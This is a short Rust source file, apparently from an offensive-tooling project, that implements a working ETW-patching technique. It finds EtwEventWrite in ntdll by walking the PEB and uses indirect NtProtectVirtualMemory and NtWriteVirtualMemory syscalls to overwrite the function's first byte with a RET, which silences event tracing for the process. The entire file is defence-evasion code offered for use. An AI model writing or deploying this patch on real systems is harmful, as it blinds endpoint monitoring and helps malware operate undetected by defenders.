use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

use thermite::indirect_syscall as syscall;
use thermite::info;
use thermite::peb_walk::{get_function_address, get_module_handle};


fn main() {
	local_etw_patcher();
}


// Patches ETW by rewriting the first bit of EtwEventWrite with a RET instruction
// This technique is easy to detect and i didn't get it to work remotely
fn local_etw_patcher() {
	let process_handle: isize = -1;
	let mut old_protec: u32 = 0;
	let mut new_protec: u32 = 0;
	let patch: char = char::from(0xc3);

	let ntdll_handle = unsafe { get_module_handle("ntdll.dll") }.unwrap();
	let mut etw_handle = unsafe { get_function_address("EtwEventWrite", ntdll_handle) }.unwrap();

	// First we unprotect the memory region hosting the EtwEventWrite function
	let mut bytes_written: usize = 1;
	syscall!("NtProtectVirtualMemory",
        process_handle,          // [in]      HANDLE  ProcessHandle,
        &mut etw_handle,         // [in, out] PVOID   *BaseAddress,
        &mut bytes_written,      // [in, out] PULONG  NumberOfBytesToProtect,
        PAGE_EXECUTE_READWRITE,  // [in]      ULONG   NewAccessProtection,
        &mut old_protec);        // [out]     PULONG  OldAccessProtection,

	// We write our patch
	syscall!("NtWriteVirtualMemory",
        process_handle,      // [in]            HANDLE  ProcessHandle,
        &etw_handle,         // [in]            PVOID   *BaseAddress,
        &patch,              // [in]            PVOID   buffer,
        1usize,              // [in]            ULONG   NumberOfBytesToWrite,
        &mut bytes_written); // [out, optional] PULONG  NumberOfBytesWritten ,

	info!("Written {} bytes in remote memory", bytes_written);

	// Then we put the memory protection back in its original state
	syscall!("NtProtectVirtualMemory",
        process_handle,      // [in]      HANDLE  ProcessHandle,
        &mut etw_handle,     // [in, out] PVOID   *BaseAddress,
        &mut bytes_written,  // [in, out] PULONG  NumberOfBytesToProtect,
        old_protec,          // [in]      ULONG   NewAccessProtection,
        &mut new_protec);    // [out]     PULONG  OldAccessProtection,

	// ETW should be patched for our process
}